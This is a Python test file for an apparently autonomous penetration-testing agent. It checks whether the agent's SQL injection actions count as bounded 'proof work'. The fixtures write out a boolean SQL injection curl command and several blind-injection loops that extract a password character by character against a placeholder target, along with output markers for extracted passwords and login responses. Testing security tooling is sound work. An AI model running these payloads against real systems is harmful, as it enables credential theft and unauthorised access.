from __future__ import annotations

from ravage.agent_core.frontier_proof_work import (
    action_attempts_bounded_proof_work,
    bounded_proof_work_constraints,
    bounded_proof_work_message,
    objective_requires_bounded_proof_work,
    worker_attempted_bounded_proof_work,
)
from ravage.agent_core.frontier_route import FrontierObjective


def _objective() -> FrontierObjective:
    return FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:proof_channel",
        expected_signal="extract replayable target proof",
        evidence_refs=("primitive:sqli_confirmed:turn:6",),
    )


def test_sql_proof_channel_requires_bounded_extraction_before_handoff() -> None:
    objective = _objective()
    one_off_predicate = {
        "action": "run_command",
        "command": ('curl /index.php --data "username=x\' OR length(database())>0-- -"'),
    }

    assert objective_requires_bounded_proof_work(objective)
    assert not action_attempts_bounded_proof_work(one_off_predicate)
    assert "finite bound" in bounded_proof_work_message(objective)


def test_proof_work_protocol_names_durable_output_markers() -> None:
    constraints = " ".join(bounded_proof_work_constraints())

    assert "TARGET_LEN=" in constraints
    assert "PREFIX[position]=" in constraints
    assert "EXTRACTED_PASSWORD=" in constraints
    assert "LOGIN_RESPONSE=" in constraints


def test_run6_style_boolean_extractor_counts_as_bounded_proof_work() -> None:
    action = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "for pos in range(1, 33):\n"
            "    expr=f'ascii(substring((select password),{pos},1))>64'\n"
            "    urllib.request.urlopen(request)\n"
            "    print({'prefix': prefix})\n"
        ),
    }
    attempts = [
        {
            "frontier_worker_id": "worker-003",
            "frontier_objective_aligned": True,
            "selected_action": action,
        }
    ]

    assert action_attempts_bounded_proof_work(action)
    assert worker_attempted_bounded_proof_work(
        attempts,
        worker_id="worker-003",
    )
    assert not worker_attempted_bounded_proof_work(
        attempts,
        worker_id="worker-004",
    )


def test_finite_character_equality_enumeration_is_bounded_proof_work() -> None:
    action = {
        "action": "run_command",
        "command": (
            'python3 -c "'
            "for pos in range(1,9):\n"
            " for code in range(32,127):\n"
            "  payload=f'SUBSTRING((SELECT password),{pos},1)={chr(code)}';\n"
            "  urllib.request.urlopen('http://target/index.php?username='+payload);\n"
            "  print('PREFIX',pos,prefix)\""
        ),
    }

    assert action_attempts_bounded_proof_work(action)


def test_finite_like_prefix_enumeration_is_bounded_proof_work() -> None:
    action = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "charset='abc'\n"
            "prefix=''\n"
            "for pos in range(1,17):\n"
            "    for ch in charset:\n"
            "        candidate=prefix+ch\n"
            """        payload=f"EXISTS(SELECT 1 FROM users WHERE """
            """username LIKE BINARY '{candidate}%')"\n"""
            "        urllib.request.urlopen('http://target/index.php?username='+payload)\n"
            "        print('PREFIX',prefix)\n"
        ),
    }

    assert action_attempts_bounded_proof_work(action)


def test_unbounded_boolean_extractor_does_not_satisfy_proof_work_gate() -> None:
    action = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "while True:\n"
            "    expr='ascii(substring((select password),1,1))>64'\n"
            "    urllib.request.urlopen(request)\n"
            "    print({'prefix': prefix})\n"
        ),
    }

    assert not action_attempts_bounded_proof_work(action)


def test_open_ended_counter_does_not_satisfy_proof_work_gate() -> None:
    action = {
        "action": "run_python",
        "code": (
            "import itertools, urllib.request\n"
            "for pos in itertools.count(1):\n"
            "    expr=f'ascii(substring((select password),{pos},1))>64'\n"
            "    urllib.request.urlopen(request)\n"
            "    print({'prefix': prefix})\n"
        ),
    }

    assert not action_attempts_bounded_proof_work(action)
